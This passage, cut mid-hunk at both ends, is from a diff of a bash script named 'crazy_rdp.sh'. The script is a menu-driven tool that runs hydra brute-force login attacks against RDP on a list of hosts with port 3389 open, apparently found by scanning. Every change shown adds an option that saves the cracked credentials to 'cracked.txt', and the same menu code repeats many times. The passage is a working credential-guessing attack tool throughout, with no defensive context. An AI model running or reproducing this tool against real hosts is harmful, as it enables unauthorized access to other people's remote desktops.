-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8183,7 +8183,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8227,7 +8227,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8237,7 +8237,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8247,7 +8247,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8256,7 +8256,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8300,7 +8300,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8310,7 +8310,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8320,7 +8320,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8329,7 +8329,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8373,7 +8373,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8383,7 +8383,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8393,7 +8393,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8402,7 +8402,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8445,7 +8445,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8455,7 +8455,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8465,7 +8465,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8474,7 +8474,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8518,7 +8518,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8528,7 +8528,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8538,7 +8538,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8547,7 +8547,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8591,7 +8591,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8601,7 +8601,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8611,7 +8611,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8620,7 +8620,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8664,7 +8664,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8674,7 +8674,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8684,7 +8684,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8693,7 +8693,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8737,7 +8737,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8747,7 +8747,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8757,7 +8757,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8766,7 +8766,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8810,7 +8810,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8820,7 +8820,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8830,7 +8830,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8839,7 +8839,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8883,7 +8883,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8893,7 +8893,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8903,7 +8903,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8912,7 +8912,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8955,7 +8955,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8965,7 +8965,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8975,7 +8975,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -8984,7 +8984,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9028,7 +9028,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9038,7 +9038,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9048,7 +9048,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9057,7 +9057,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9101,7 +9101,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9111,7 +9111,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9121,7 +9121,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9130,7 +9130,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9174,7 +9174,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9184,7 +9184,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9194,7 +9194,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9203,7 +9203,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9247,7 +9247,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9257,7 +9257,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9267,7 +9267,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9276,7 +9276,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9320,7 +9320,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -9330,7 +9330,7 @@ fi
 if [ $brutmenu = "2" ]; then
